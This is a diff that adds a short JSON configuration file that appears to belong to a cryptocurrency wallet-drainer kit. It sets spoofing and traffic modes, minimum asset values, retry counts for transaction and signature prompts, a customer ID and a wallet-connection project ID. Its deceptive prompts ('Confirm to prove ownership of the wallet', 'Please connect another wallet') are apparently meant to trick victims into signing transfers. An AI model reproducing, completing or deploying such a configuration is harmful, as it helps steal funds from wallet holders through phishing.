@@ -1,0 +1,16 @@
+{
+  "TRAFFIC": "1",
+  "SPOOF": "4",
+  "ASSET_MIN": "40",
+  "TOTAL_MIN": "40",
+  "MODAL_STYLE": "0",
+  "DARK_MODE": true,
+  "LOADING_MESSAGE": "Processing...",
+  "CONFIRM_MESSAGE": "Please confirm the transaction",
+  "ERROR_MESSAGE": "Please connect another wallet",
+  "SIGNATURE": "Confirm to prove ownership of the wallet",
+  "TX_RETRY_COUNT": "3",
+  "SIG_RETRY_COUNT": "1",
+  "CUSTOMER_ID": "5FE2-3C22-901D",
+  "REOWN_ID": "a10de0f0f7a4bada45217b92e699ba10"
+}
